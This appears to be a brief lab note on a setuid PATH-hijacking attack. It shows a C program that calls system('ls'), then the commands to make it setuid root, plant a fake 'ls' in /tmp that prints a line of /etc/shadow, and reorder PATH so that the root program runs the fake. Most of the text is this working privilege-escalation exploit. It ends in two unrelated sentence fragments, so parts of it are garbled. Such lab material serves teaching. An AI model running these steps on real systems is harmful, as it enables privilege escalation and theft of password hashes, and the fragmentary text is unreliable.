path and setuid

#include <stdlib.h>

int main() {
  system("ls");
  return 0;
}

turning it into a setuid program and manipulating it to use a modified, malicious version of ls:

# temporarily change /bin/sh to /bin/zsh for the exploit to work
sudo ln -sf /bin/zsh /bin/sh

# compile the program
gcc ls.c

# turn on the setuid bit
sudo chown root:root a.out
sudo chmod u+s a.out

# create our own executable ls
[ ! -d /tmp/mybin ] && mkdir /tmp/mybin/
echo -e "#!/usr/bin/zsh
tail -1 /etc/shadow" > /tmp/mybin/ls
chmod +x /tmp/mybin/ls

# execute the program with a modified PATH
export PATH="/tmp/mybin/:$PATH" # /tmp/mybin should precede /bin
./a.out

# restore dash cuz i dont want my script to be slow
sudo ln -sf /bin/dash /bin/sh

set-group-ID program, or a program with capabilities) because

do this when invoked as sh.)
